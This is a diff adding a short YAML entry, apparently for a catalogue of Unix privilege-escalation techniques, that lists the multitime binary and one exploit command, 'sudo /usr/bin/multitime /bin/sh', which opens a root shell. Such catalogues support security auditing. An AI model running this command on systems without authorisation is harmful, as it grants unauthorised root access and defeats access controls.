@@ -1,0 +1,4 @@
+name: multitime
+binary_path: /usr/bin/multitime
+exploit_cmds:
+- sudo /usr/bin/multitime /bin/sh
